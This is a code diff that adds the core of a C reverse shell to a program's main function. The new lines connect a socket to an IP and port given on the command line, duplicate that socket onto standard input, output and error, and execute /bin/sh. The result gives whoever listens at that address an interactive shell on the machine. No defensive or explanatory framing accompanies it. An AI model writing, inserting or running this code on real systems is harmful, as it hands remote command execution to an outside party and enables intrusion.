@@ -42,5 +42,32 @@ int main(int argc, char *argv[]) {
     int port = atoi(argv[2]);
     struct sockaddr_in revsockaddr;
 
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockt < 0) {
+        perror("socket");
+        return 1;
+    }
+
+    revsockaddr.sin_family = AF_INET;
+    revsockaddr.sin_port = htons(port);
+    if (inet_pton(AF_INET, ip, &revsockaddr.sin_addr) <= 0) {
+        perror("inet_pton");
+        return 1;
+    }
+
+    if (connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)) < 0) {
+        perror("connect");
+        return 1;
+    }
+
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const exec_args[] = {"/bin/sh", NULL};
+    execve("/bin/sh", exec_args, NULL);
+
+    perror("execve");
+
     return 1;
 }
